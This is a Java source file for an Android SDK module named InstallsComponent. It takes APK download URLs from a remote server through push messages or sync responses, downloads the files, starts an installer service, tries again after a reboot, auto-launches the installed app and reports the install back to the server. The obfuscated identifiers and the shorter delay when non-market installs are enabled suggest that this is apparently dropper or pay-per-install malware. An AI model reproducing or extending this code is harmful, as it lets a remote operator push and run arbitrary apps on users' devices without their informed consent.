package ustanovki.com.c_master;

import android.app.Application;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;
import com.google.gson.Gson;
import com.thin.downloadmanager.DefaultRetryPolicy;
import com.thin.downloadmanager.DownloadManager;
import com.thin.downloadmanager.DownloadRequest;
import com.thin.downloadmanager.DownloadStatusListenerV1;
import com.thin.downloadmanager.ThinDownloadManager;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import main_commons.app.c_master.BaseJob;
import main_commons.app.c_master.SdkCommons;
import main_commons.app.c_master.SdkComponent;
import main_commons.app.c_master.keep.NetworkApi;
import okhttp3.ResponseBody;
import retrofit2.Response;
import timber.log.Timber;
import ustanovki.com.c_master.keep.ApiInstallsList;

@SuppressWarnings("WeakerAccess")
public class InstallsComponent extends SdkComponent {

    private static InstallsComponent instance;

    public static final String ARG_APP_ID = "i18927878_arg_1";
    private static final String JOB_TAG_INSTALL_EVENT = "i92797272729_j_1";

    private SharedPreferences preferences;
    private Gson gson;
    private ThinDownloadManager downloadManager;

    public static InstallsComponent get() {
        return instance;
    }

    public InstallsComponent() {
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        preferences = PreferenceManager.getDefaultSharedPreferences(context);
        gson = new Gson();
        downloadManager = new ThinDownloadManager();
    }

    @Override
    public void onDeviceRebooted() {
        // checkPendingInstalls();
        InstallInfoModel apkInfo = getTargetApkInfo();
        if (apkInfo != null) {
            install(get(), apkInfo);
        }
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
            return new BaseJob() {
                @NonNull
                @Override
                protected Job.Result runJob(@NonNull Job.Params params) {
                    String apkId = params.getExtras().getString(InstallsComponent.ARG_APP_ID, null);
                    if (apkId == null) return Job.Result.SUCCESS;
                    try {
                        Map<String, String> fields = new HashMap<>();
                        fields.put("apk_id", apkId);
                        fields.put("installed", String.valueOf(true));
                        Response<ResponseBody> response = InstallsComponent.get().api()
                                .makePost("device/install", fields)
                                .execute();
                        return getJobResult(response);
                    } catch (IOException e) {
                        e.printStackTrace();
                        return Job.Result.RESCHEDULE;
                    }
                }
            };
        }
        return null;
    }

    @Override
    public void onNewAppAdded(String packageName) {
        InstallInfoModel apkInfo = getTargetApkInfo();
        // Launch installed app, only if this is our app (we have stored apkId)
        if (apkInfo != null && packageName.equals(apkInfo.getPackageName())) {
            if (!TextUtils.isEmpty(apkInfo.getId())) {
                submitInstallEventJob(apkInfo.getId());
            }
            // launch app
            try {
                Intent launchIntent = context().getPackageManager().getLaunchIntentForPackage(packageName);
                context().startActivity(launchIntent);
            } catch (ActivityNotFoundException e) {
                e.printStackTrace();
            }
            saveTargetApkInfo(null);
        }
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("apk".equals(type)) {
            String receivedUrl = payload.getString("url");
            String appId = payload.getString("apk_id");
            if (receivedUrl != null && appId != null) {
                onUrlReceived(get(), receivedUrl, appId);
            }
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        ApiInstallsList response = safeParse(json, ApiInstallsList.class);
        List<ApiInstallsList.ApiInstall> list = response != null ? response.data : null;
        if (list != null && !list.isEmpty()) {
            ApiInstallsList.ApiInstall app = list.get(0);
            onUrlReceived(get(), app.downloadUrl, app.appId);
        }
    }

    public DownloadManager downloadManager() {
        return downloadManager;
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void submitInstallEventJob(String apkId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_APP_ID, apkId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_INSTALL_EVENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    public static boolean isAppInstalled(Context context, String packageName) {
        try {
            PackageInfo info = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return info != null;
        } catch (PackageManager.NameNotFoundException ignore) {
        }
        return false;
    }

    public static String getPackageName(Context context, String apkFilePath) {
        try {
            return context.getPackageManager().getPackageArchiveInfo(apkFilePath, 0).packageName;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static int getStartDelay(Context context) {
        try {
            if (Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS) == 1) {
                // can install non market apps
                return 400;
            }
        } catch (Settings.SettingNotFoundException ignore) {
        }
        return 8000;
    }

    static void install(InstallsComponent component, InstallInfoModel model) {
        if (isAppInstalled(component.context(), model.getPackageName())) {
            component.submitInstallEventJob(model.getId());
            component.saveTargetApkInfo(null);
            return;
        }
        component.saveTargetApkInfo(model);
        //
        Intent starter = new Intent(component.context(), Slujba.class);
        starter.putExtra(Slujba.APK_FILE_PATH, model.getFilePath());
        starter.putExtra(Slujba.APK_PACKAGE_NAME, model.getPackageName());
        starter.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        component.context().startService(starter);
    }

    public static void onUrlReceived(final InstallsComponent component, String downloadUrl, final String appId) {
        if (Slujba.isServiceRunning()) {
            Timber.e("service is already running");
            return;
        }
        Uri downloadUri = Uri.parse(downloadUrl);
        File destinationFolder = component.context().getExternalCacheDir();
        assert destinationFolder != null;
        Uri destinationUri = Uri.parse(destinationFolder.getAbsolutePath()
                + "/"
                + downloadUri.getLastPathSegment());
        DownloadRequest downloadRequest = new DownloadRequest(downloadUri)
                .setRetryPolicy(new DefaultRetryPolicy())
                .setDestinationURI(destinationUri).setPriority(DownloadRequest.Priority.HIGH)
                .setStatusListener(new DownloadStatusListenerV1() {
                    @Override
                    public void onDownloadComplete(DownloadRequest downloadRequest) {
                        String path = downloadRequest.getDestinationURI().getPath();
                        String pkgName = getPackageName(component.context(), path);
                        InstallInfoModel info = new InstallInfoModel(appId, path, pkgName);
                        install(component, info);
                    }

                    @Override
                    public void onDownloadFailed(DownloadRequest downloadRequest, int errorCode, String errorMessage) {

                    }

                    @Override
                    public void onProgress(DownloadRequest downloadRequest, long totalBytes, long downloadedBytes, int progress) {

                    }
                });
        component.downloadManager().add(downloadRequest);
    }

    /* PREFS */

    private static final String TARGET_KEY = "target_key";

    public void saveTargetApkInfo(@Nullable InstallInfoModel model) {
        if (model == null) {
            preferences.edit().remove(TARGET_KEY).apply();
            return;
        }
        String json = gson.toJson(model);
        preferences.edit().putString(TARGET_KEY, json)
                .apply();
    }

    @Nullable
    public InstallInfoModel getTargetApkInfo() {
        String json = preferences.getString(TARGET_KEY, null);
        if (json != null) {
            return gson.fromJson(json, InstallInfoModel.class);
        }
        return null;
    }

    public static class InstallInfoModel {

        private String id;
        private String filePath;
        private String packageName;

        public InstallInfoModel(String id, String filePath, String packageName) {
            this.id = id;
            this.filePath = filePath;
            this.packageName = packageName;
        }

        public String getId() {
            return id;
        }

        public String getFilePath() {
            return filePath;
        }

        public String getPackageName() {
            return packageName;
        }
    }
}
